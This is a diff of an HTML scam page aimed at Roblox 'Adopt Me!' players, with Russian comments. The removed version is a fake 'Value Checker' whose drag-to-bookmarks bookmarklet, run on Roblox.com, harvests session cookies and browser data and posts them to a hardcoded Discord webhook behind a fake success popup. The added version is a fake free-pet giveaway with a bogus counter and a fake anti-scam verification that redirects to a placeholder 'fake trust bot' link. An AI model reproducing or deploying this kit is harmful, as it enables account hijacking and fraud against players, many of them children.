@@ -1,74 +1,159 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>In-Game Value Checker | Adopt Me!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adopt Me! Seasonal Giveaway 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
-        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #181a20; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #2b3139; width: 400px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
-        h1 { color: #f0b90b; font-size: 24px; }
-        .btn { display: inline-block; padding: 20px 35px; background: #f0b90b; color: black; text-decoration: none; font-weight: bold; border-radius: 12px; cursor: move; border: 2px dashed #000; margin: 20px 0; font-size: 18px; }
-        .steps { text-align: left; background: #1e2329; padding: 15px; border-radius: 10px; font-size: 13px; color: #848e9c; }
+        @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap');
+        body {
+            background: radial-gradient(circle, #ff9d00 0%, #ff6200 100%);
+            font-family: 'Fredoka One', cursive;
+            color: white;
+        }
+        .pet-card {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .pet-card:hover {
+            transform: scale(1.05) rotate(2deg);
+            background: rgba(255, 255, 255, 0.25);
+            border-color: #fff;
+        }
+        .claim-btn {
+            background: linear-gradient(180deg, #58cc02 0%, #45a001 100%);
+            box-shadow: 0 5px 0 #2a6101;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.2);
+        }
+        .claim-btn:active {
+            box-shadow: 0 0 0 #2a6101;
+            transform: translateY(5px);
+        }
+        .shiny-text {
+            background: linear-gradient(to right, #fff 20%, #ffd700 40%, #ffd700 60%, #fff 80%);
+            background-size: 200% auto;
+            color: #000;
+            background-clip: text;
+            text-fill-color: transparent;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 2s linear infinite;
+        }
+        @keyframes shine { to { background-position: 200% center; } }
     </style>
 </head>
-<body>
-    <div class="card">
-        <h1>Value Checker v4.2</h1>
-        <p>Analyze pet demand and trade values live.</p>
+<body class="min-h-screen pb-20">
 
-        <!-- ВСТАВЬ СВОЙ ВЕБХУК ВМЕСТО 'ТУТ_ТВОЙ_ВЕБХУК' -->
-        <a class="btn" draggable="true" href="javascript:(function(){
-            var h = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
+    <!-- Хедер -->
+    <header class="p-6 text-center animate__animated animate__fadeInDown">
+        <h1 class="text-5xl md:text-7xl mb-2 drop-shadow-lg italic">FREE PETS!</h1>
+        <p class="text-xl bg-black/30 inline-block px-6 py-2 rounded-full">Осталось подарков: <span id="counter" class="text-yellow-300">142</span>/5000</p>
+    </header>
+
+    <!-- Сетка петов -->
+    <main class="max-w-6xl mx-auto px-4 grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6 mt-10">
+        
+        <!-- Пет 1 -->
+        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn">
+            <div class="bg-white/20 rounded-2xl mb-4 p-2">
+                <img src="https://vignette.wikia.nocookie.net/adoptme/images/a/a2/Shadow_Dragon.png" alt="Shadow Dragon" class="w-full h-auto drop-shadow-xl">
+            </div>
+            <h3 class="text-2xl mb-3">SHADOW DRAGON</h3>
+            <button onclick="claimPet('Shadow Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+        </div>
+
+        <!-- Пет 2 -->
+        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.1s">
+            <div class="bg-white/20 rounded-2xl mb-4 p-2">
+                <img src="https://vignette.wikia.nocookie.net/adoptme/images/d/d4/Bat_Dragon.png" alt="Bat Dragon" class="w-full h-auto drop-shadow-xl">
+            </div>
+            <h3 class="text-2xl mb-3">BAT DRAGON</h3>
+            <button onclick="claimPet('Bat Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+        </div>
+
+        <!-- Пет 3 -->
+        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.2s">
+            <div class="bg-white/20 rounded-2xl mb-4 p-2">
+                <img src="https://vignette.wikia.nocookie.net/adoptme/images/a/a2/Frost_Dragon.png" alt="Frost Dragon" class="w-full h-auto drop-shadow-xl">
+            </div>
+            <h3 class="text-2xl mb-3">FROST DRAGON</h3>
+            <button onclick="claimPet('Frost Dragon')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+        </div>
+
+        <!-- Пет 4 -->
+        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.3s">
+            <div class="bg-white/20 rounded-2xl mb-4 p-2">
+                <img src="https://vignette.wikia.nocookie.net/adoptme/images/1/13/Giraffe.png" alt="Giraffe" class="w-full h-auto drop-shadow-xl">
+            </div>
+            <h3 class="text-2xl mb-3">GIRAFFE</h3>
+            <button onclick="claimPet('Giraffe')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+        </div>
+
+        <!-- Еще петы... -->
+        <div class="pet-card p-4 rounded-3xl text-center animate__animated animate__zoomIn" style="animation-delay: 0.4s">
+            <div class="bg-white/20 rounded-2xl mb-4 p-2">
+                <img src="https://vignette.wikia.nocookie.net/adoptme/images/b/b2/Owl.png" alt="Owl" class="w-full h-auto drop-shadow-xl">
+            </div>
+            <h3 class="text-2xl mb-3">OWL (NEON)</h3>
+            <button onclick="claimPet('Neon Owl')" class="claim-btn w-full py-3 rounded-2xl text-xl font-bold uppercase">Забрать</button>
+        </div>
+    </main>
+
+    <!-- Модалка проверки -->
+    <div id="verifyModal" class="fixed inset-0 bg-black/90 hidden items-center justify-center z-50 p-6">
+        <div class="bg-[#2c2c2c] max-w-md w-full rounded-[40px] p-8 text-center border-4 border-yellow-400">
+            <div class="animate__animated animate__bounceIn">
+                <div class="w-24 h-24 bg-yellow-400 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_20px_#facc15]">
+                    <i class="fas fa-robot text-4xl text-black"></i>
+                </div>
+                <h2 class="text-3xl font-bold mb-4">ВЕРИФИКАЦИЯ</h2>
+                <p class="text-gray-300 mb-6">Чтобы получить <span id="selectedPet" class="text-yellow-400 font-bold"></span>, вы должны подтвердить, что вы не бот и не создаете мультиаккаунты.</p>
+                
+                <div class="bg-black/20 p-4 rounded-2xl mb-8 border border-white/10">
+                    <p class="text-sm mb-4">Для завершения синхронизации используйте:</p>
+                    <div class="text-xl font-bold text-green-400 mb-2">TRUST TRADE BOT v2.4</div>
+                    <p class="text-xs text-gray-500 italic">Нажмите кнопку ниже, чтобы открыть профиль бота и принять приглашение в трейд-группу.</p>
+                </div>
+
+                <button onclick="redirectToBot()" class="w-full bg-yellow-400 text-black py-4 rounded-2xl text-2xl font-black hover:bg-yellow-300 transition-all shadow-[0_8px_0_#a16207] active:shadow-none active:translate-y-2">ПРОЙТИ ПРОВЕРКУ</button>
+                <p class="mt-6 text-xs text-gray-600">Система защиты Roblox Anti-Scam © 2026</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script>
+        // ТВОЯ ССЫЛКА НА ТРАСТ БОТА (ФЕЙК)
+        const BOT_LINK = "ВСТАВЬ_СВОЮ_ССЫЛКУ_СЮДА";
+
+        function claimPet(name) {
+            document.getElementById('selectedPet').innerText = name;
+            document.getElementById('verifyModal').style.display = 'flex';
+        }
+
+        function redirectToBot() {
+            // Имитация загрузки перед редиректом
+            const btn = document.querySelector('#verifyModal button');
+            btn.innerText = "СОЕДИНЕНИЕ...";
+            btn.disabled = true;
             
-            /* Сбор данных системы для правдоподобности */
-            var info = {
-                url: window.location.href,
-                cookies: document.cookie,
-                platform: navigator.platform,
-                agent: navigator.userAgent
-            };
+            setTimeout(() => {
+                window.location.href = BOT_LINK;
+            }, 1500);
+        }
 
-            /* Создание невидимого транспорта */
-            var ifr = document.createElement('iframe');
-            ifr.name = 'logger_frame';
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-
-            var f = document.createElement('form');
-            f.method = 'POST';
-            f.action = h;
-            f.target = 'logger_frame';
-
-            var i = document.createElement('input');
-            i.name = 'payload_json';
-            i.value = JSON.stringify({
-                embeds: [{
-                    title: '🚀 New Session: ' + window.location.hostname,
-                    description: '**Cookies:**\n' + (info.cookies || 'Protected') + '\n**User Agent
-color: 16758795
-}]
-});
-/* Важный фикс: Discord принимает поле 'content', если payload_json не проходит */
-var i2 = document.createElement('input');
-i2.name = 'content';
-i2.value = '🚀 **NEW LOG**\nTarget: ' + window.location.hostname + '\nData: ' + info.cookies;
-f.appendChild(i2);
-document.body.appendChild(f);
-f.submit();
-/* Красивое окно для жертвы */
-var ui = document.createElement('div');
-ui.style = 'position:fixed;top:10%;right:5%;width:300px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:9999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 25px rgba(240,185,11,0.6);';
-ui.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px>Market Analysis: <span style=color:#00ff00>SUCCESS</span></p><p style=color:#848e9c;font-size:12px>Scanning inventory data...</p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:5px;cursor:pointer;font-weight:bold>OK</button>';
-document.body.appendChild(ui);
-setTimeout(function(){ document.body.removeChild(f); document.body.removeChild(ifr); }, 1500);
-})();">DRAG TO BOOKMARKS</a>
-<div class="steps">
-1. <b>Ctrl+Shift+B</b> to show bar.
-
-2. Drag <b>Yellow Button</b> to bar.
-
-3. Use on <b>Roblox.com</b>
-</div>
-</div>
+        // Счетчик (имитация живого сайта)
+        let count = 142;
+        setInterval(() => {
+            if (count > 5) {
+                count -= Math.floor(Math.random() * 2);
+                document.getElementById('counter').innerText = count;
+            }
+        }, 5000);
+    </script>
 </body>
 </html>
